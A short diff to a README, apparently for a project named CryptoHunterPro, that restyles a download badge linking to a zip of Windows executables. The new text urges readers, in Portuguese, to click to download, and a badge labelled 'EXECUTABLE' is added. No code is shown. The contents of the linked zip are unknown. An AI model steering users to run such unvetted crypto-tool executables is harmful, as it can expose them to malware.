@@ -70,8 +70,10 @@
 
 <p align="center">
   <a href="https://github.com/henriquesmlourenco/CryptoHunterPro/raw/main/CryptoHunterPro_Windows_Executables.zip">
-    <img src="https://img.shields.io/badge/Download-Windows%20Executables-blue?style=for-the-badge&logo=windows&logoColor=white" />
+    <img src="https://img.shields.io/badge/CLIQUE%20AQUI%20PARA%20FAZER%20O-DOWNLOAD-blue?style=for-the-badge&logo=windows&logoColor=white" />
   </a>
+  <br/>
+  <img src="https://img.shields.io/badge/EXECUT%C3%81VEL-EXECUTABLE-gray?style=for-the-badge" />
 </p>
 
 <p align="center">
